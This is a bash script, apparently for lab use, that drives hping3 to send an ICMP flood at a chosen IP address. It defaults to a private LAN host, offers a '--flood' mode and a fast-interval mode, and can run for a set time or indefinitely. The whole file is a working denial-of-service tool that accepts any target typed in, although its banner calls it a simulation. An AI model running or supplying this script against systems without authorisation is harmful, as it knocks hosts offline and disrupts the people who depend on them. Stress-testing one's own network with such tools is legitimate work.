#!/bin/bash

# ==============================================================================
# CONFIG
# ==============================================================================

DEFAULT_TARGET_IP="192.168.0.122"



# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Error: This script must be run as root or with sudo."
    echo "Usage: sudo $0"
    exit 1
fi

# ==============================================================================
# FUNCTIONS
# ==============================================================================

run_icmp_test() {
    local target_ip=$1
    local duration_sec=$2
    local mode_flag=$3

    echo -e "\n---> Launching ICMP traffic test against ${target_ip}..."
    if [ "$duration_sec" -eq 0 ]; then
        echo "Running indefinitely. Press Ctrl+C to stop."
        hping3 $mode_flag --icmp "${target_ip}"
    else
        echo "Running for ${duration_sec} second(s)..."
        timeout "${duration_sec}s" hping3 $mode_flag --icmp "${target_ip}"
    fi
}

cleanup() {
    echo -e "\n\n---> Aborting: Stopping hping3 process..."
    pkill -f hping3
    echo "Test stopped. Exiting."
    exit 0
}

trap cleanup INT

# ==============================================================================
# PROMPT & EXECUTION
# ==============================================================================

echo "=========================================================="
echo "           ICMP FLOOD ATTACK SIMULATION"
echo "=========================================================="
echo "Default Target Node: ${DEFAULT_TARGET_IP}"
echo "=========================================================="
read -p "Use default target IP (${DEFAULT_TARGET_IP})? (y/n): " IP_CHOICE

if [[ "$IP_CHOICE" =~ ^[Yy]$ ]]; then
    TARGET_IP="$DEFAULT_TARGET_IP"
else
    read -p "Enter custom target IP address: " CUSTOM_IP
    if [ -z "$CUSTOM_IP" ]; then
        echo "No IP address entered. Exiting."
        exit 1
    fi
    TARGET_IP="$CUSTOM_IP"
fi

echo -e "\n=========================================================="
echo "Select Traffic Mode:"
echo "1) High-Speed Traffic (--flood)"
echo "2) Fast Interval Traffic (-i u1000)"
echo "=========================================================="
read -p "Enter choice [1-2]: " MODE_CHOICE

case "$MODE_CHOICE" in
    1)
        FLAGS="--flood"
        ;;
    2)
        FLAGS="-i u1000"
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac

read -p "Enter test duration in seconds (or type 0 for indefinite run): " DURATION

echo -e "\n=========================================================="
echo "CONFIRMATION:"
echo " Target IP: ${TARGET_IP}"
echo " Mode:      ${FLAGS}"
echo " Duration:  ${DURATION}s"
echo "=========================================================="
read -p "Proceed with execution? (y/n): " CONFIRM

if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
    run_icmp_test "$TARGET_IP" "$DURATION" "$FLAGS"
    echo -e "\nICMP test execution completed."
else
    echo "Execution aborted."
    exit 0
fi